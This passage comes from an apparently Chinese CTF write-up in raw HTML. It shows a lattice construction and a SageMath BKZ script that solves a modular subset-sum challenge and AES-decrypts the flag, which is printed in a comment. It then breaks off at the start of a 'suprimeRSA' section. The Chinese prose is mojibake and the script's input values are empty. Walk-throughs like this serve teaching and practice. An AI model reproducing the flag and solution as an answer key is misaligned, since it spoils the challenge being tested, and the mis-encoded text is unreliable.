class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">2</span><span class="mclose">]</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">â‹®</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">3</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">3</span><span class="mclose">]</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">3</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">2</span><span class="mclose">]</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">â‹®</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">3</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mopen">[</span><span class="mord">3</span><span class="mclose">]</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.550045em;"><span style="top:-0.7499750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â </span></span></span><span style="top:-1.8999850000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>âŸ</span></span></span><span style="top:-2.4949950000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>âŸ</span></span></span><span style="top:-3.090005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>âŸ</span></span></span><span style="top:-3.6850150000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>âŸ</span></span></span><span style="top:-4.280025em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>âŸ</span></span></span><span style="top:-4.3100249999999996em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>âŸ</span></span></span><span style="top:-5.550045em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.050045em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>ä½†æ˜¯æ„é€ å®Œå‘ç°æ ¼ä¸å‡ºæ¥ï¼Œå°è¯•å¸¸è§çš„ä¼˜åŒ–</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">â€¦</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>63</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>63</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>63</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>63</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">â€¦</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>62</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>62</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>62</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>62</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">â‹®</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">â‹®</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">â‹±</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">â‹®</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">â‹®</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">â‹®</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">â‹®</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">â‹®</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">â€¦</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">â€¦</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\left(\begin{matrix}2&amp;0&amp;â€¦&amp;0&amp;a[0][63]&amp;a[1][63]&amp;a[2][63]&amp;a[3][63]\\0&amp;2&amp;â€¦&amp;0&amp;a[0][62]&amp;a[1][62]&amp;a[2][62]&amp;a[3][62]\\â‹®&amp;â‹®&amp;â‹±&amp;â‹®&amp;â‹®&amp;â‹®&amp;â‹®&amp;â‹®\\0&amp;0&amp;â€¦&amp;2&amp;a[0][0]&amp;a[1][0]&amp;a[2][0]&amp;a[3][0]\\1&amp;1&amp;â€¦&amp;1&amp;b[0]&amp;b[1]&amp;b[2]&amp;b[3]\\\end{matrix}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:6.66em;vertical-align:-3.079999999999999em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.550045em;"><span style="top:-0.7499750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â</span></span></span><span style="top:-1.8999850000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>âœ</span></span></span><span style="top:-2.4949950000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>âœ</span></span></span><span style="top:-3.090005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>âœ</span></span></span><span style="top:-3.6850150000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>âœ</span></span></span><span style="top:-4.280025em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>âœ</span></span></span><span style="top:-4.3100249999999996em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>âœ</span></span></span><span style="top:-5.550045em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â›</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.050045em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">â‹®</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">â‹®</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.240000000000001em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">â€¦</span></span></span><span style="top:-5.04em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">â€¦</span></span></span><span style="top:-3.18em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">â‹±</span></span></span><span style="top:-1.9800000000000009em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">â€¦</span></span></span><span style="top:-0.7800000000000009em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">â€¦</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">â‹®</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">3</span><span class="mclose">]</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">2</span><span class="mclose">]</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">â‹®</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">3</span><span class="mclose">]</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">2</span><span class="mclose">]</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">â‹®</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">3</span><span class="mclose">]</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">2</span><span class="mclose">]</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">â‹®</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">3</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">3</span><span class="mclose">]</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">3</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">2</span><span class="mclose">]</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">â‹®</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">3</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mopen">[</span><span class="mord">3</span><span class="mclose">]</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.550045em;"><span style="top:-0.7499750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â </span></span></span><span style="top:-1.8999850000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>âŸ</span></span></span><span style="top:-2.4949950000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>âŸ</span></span></span><span style="top:-3.090005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>âŸ</span></span></span><span style="top:-3.6850150000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>âŸ</span></span></span><span style="top:-4.280025em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>âŸ</span></span></span><span style="top:-4.3100249999999996em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>âŸ</span></span></span><span style="top:-5.550045em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.050045em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>è¿™æ ·ä½¿ç”¨LLLæ ¼ä¸å‡ºæ¥ï¼ŒBKZå°±å¯ä»¥(æˆ‘ä¹Ÿä¸æ‡‚)</p><p>ç„¶åæ ¼å‡ºæ¥çš„ç¬¬ä¸€ä¸ªå‘é‡å°±æˆ‘ä»¬éœ€è¦çš„ï¼Œæˆ‘ä»¬çŸ¥é“æœ€é«˜ä½ä¸€å®šä¸º1ï¼Œæ‰€ä»¥è·Ÿç¬¬ä¸€ä½ä¸€æ ·çš„å°±æ˜¯1å°±è¡Œäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-built_in">list</span>=<br>bag=<br>ciphertext=<br>L=Matrix(ZZ,<span class="hljs-number">65</span>,<span class="hljs-number">68</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>    L[i,i]=<span class="hljs-number">2</span><br>    L[i,-<span class="hljs-number">1</span>]=<span class="hljs-built_in">list</span>[<span class="hljs-number">0</span>][-i-<span class="hljs-number">1</span>]<br>    L[i,-<span class="hljs-number">2</span>]=<span class="hljs-built_in">list</span>[<span class="hljs-number">1</span>][-i-<span class="hljs-number">1</span>]<br>    L[i,-<span class="hljs-number">3</span>]=<span class="hljs-built_in">list</span>[<span class="hljs-number">2</span>][-i-<span class="hljs-number">1</span>]<br>    L[i,-<span class="hljs-number">4</span>]=<span class="hljs-built_in">list</span>[<span class="hljs-number">3</span>][-i-<span class="hljs-number">1</span>]<br>L[-<span class="hljs-number">1</span>,:]=<span class="hljs-number">1</span><br>L[-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>]=bag[<span class="hljs-number">0</span>]<br>L[-<span class="hljs-number">1</span>,-<span class="hljs-number">2</span>]=bag[<span class="hljs-number">1</span>]<br>L[-<span class="hljs-number">1</span>,-<span class="hljs-number">3</span>]=bag[<span class="hljs-number">2</span>]<br>L[-<span class="hljs-number">1</span>,-<span class="hljs-number">4</span>]=bag[<span class="hljs-number">3</span>]<br>x=L.BKZ()<br><span class="hljs-built_in">print</span>(x[<span class="hljs-number">0</span>])<br>p=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x[<span class="hljs-number">0</span>][:<span class="hljs-number">64</span>]:<br>    <span class="hljs-keyword">if</span> i==x[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]:<br>        p+=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        p+=<span class="hljs-string">&#x27;0&#x27;</span><br>p=<span class="hljs-built_in">int</span>(p,<span class="hljs-number">2</span>)<br>key = hashlib.sha256(<span class="hljs-built_in">str</span>(p).encode()).digest()<br>cipher = AES.new(key, AES.MODE_ECB)<br>flag = cipher.decrypt(ciphertext)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#b&#x27;hgame&#123;A_S1mple_Modul@r_Subset_Sum_Problem&#125;\x06\x06\x06\x06\x06\x06&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="suprimersa"><a class="markdownIt-Anchor" href="#suprimersa"></a> suprimeRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 